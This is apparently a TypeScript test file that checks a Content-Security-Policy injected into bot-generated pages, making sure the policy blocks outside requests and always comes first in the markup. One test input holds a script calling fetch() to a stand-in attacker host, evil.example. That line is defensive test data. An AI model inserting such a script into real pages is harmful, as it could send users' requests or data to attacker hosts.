import assert from "node:assert/strict";
import { test } from "node:test";
import { BOT_PAGE_CSP, withBotPageCsp } from "../src/lib/botPageCsp.ts";

const META = `<meta http-equiv="Content-Security-Policy" content="${BOT_PAGE_CSP}">`;

test("a Bot's page may draw and run its own script but reach nothing", () => {
  const rules = Object.fromEntries(BOT_PAGE_CSP.split(";").map((rule) => { const [name, ...values] = rule.trim().split(/\s+/); return [name, values.join(" ")]; }));
  assert.equal(rules["default-src"], "'none'");
  // No connect-src, frame-src or object-src of its own: requests, frames and plugins fall back to 'none'.
  for (const name of ["connect-src", "frame-src", "object-src", "worker-src"]) assert.equal(rules[name], undefined, name);
  assert.equal(rules["script-src"], "'unsafe-inline'");
  assert.equal(rules["img-src"], "data:");
  assert.equal(rules["form-action"], "'none'");
  assert.equal(rules["base-uri"], "'none'");
  assert.doesNotMatch(BOT_PAGE_CSP, /https?:|\*|'self'|blob:/);
});

test("the policy is the first thing in the page, whatever the page starts with", () => {
  assert.equal(withBotPageCsp("<p>hi</p>"), `${META}<p>hi</p>`);
  assert.equal(withBotPageCsp("<!DOCTYPE html>\n<html><head><title>x</title></head><body></body></html>"), `<!doctype html>${META}\n<html><head><title>x</title></head><body></body></html>`);
  assert.equal(withBotPageCsp("﻿  <!doctype html><p>x</p>"), `<!doctype html>${META}<p>x</p>`);
  // Markup that would swallow a tag inserted "after <head>" changes nothing: the policy is already in.
  for (const page of ["<!-- <head> --><script>fetch('https://evil.example')</script>", "<script>/* <head> */</script><html><head></head></html>", "<textarea><head></textarea>", "<svg><head></svg>"]) {
    assert.ok(withBotPageCsp(page).startsWith(META), page);
  }
  // A policy the page brings itself can only narrow this one; it never replaces it.
  assert.ok(withBotPageCsp(`<meta http-equiv="Content-Security-Policy" content="default-src *">`).startsWith(META));
});
